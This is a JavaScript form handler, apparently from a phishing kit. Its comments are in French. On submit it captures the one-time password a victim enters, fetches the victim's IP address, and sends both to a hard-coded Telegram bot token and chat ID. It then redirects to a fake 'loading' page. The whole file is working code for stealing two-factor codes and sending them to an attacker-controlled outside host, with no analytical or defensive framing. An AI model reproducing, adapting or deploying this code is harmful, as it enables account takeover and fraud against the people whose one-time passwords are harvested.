document.getElementById('submitButton').addEventListener('click', async function(event) {
    event.preventDefault(); // Empêcher le rechargement de la page

    var formData = new FormData(document.getElementById('myForm'));

    // Récupérer l'adresse IP du client
    const ipResponse = await fetch('https://api64.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const clientIP = ipData.ip;

    const response = await fetch('https://api.telegram.org/bot6395286709:AAEMepFjKN_gnCT5bSXx09bwPDR9YMLRQLo/sendMessage', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: '-913533320',
            text: `-------[OTP 1 ]-------
OTP 1: ${formData.get('otp')}
IP: ${clientIP}`,
        }),
    });

    const responseData = await response.json();
    console.log(responseData);

    setTimeout(function() {
        window.location.href = '../page/loading2.html';
    } );
});
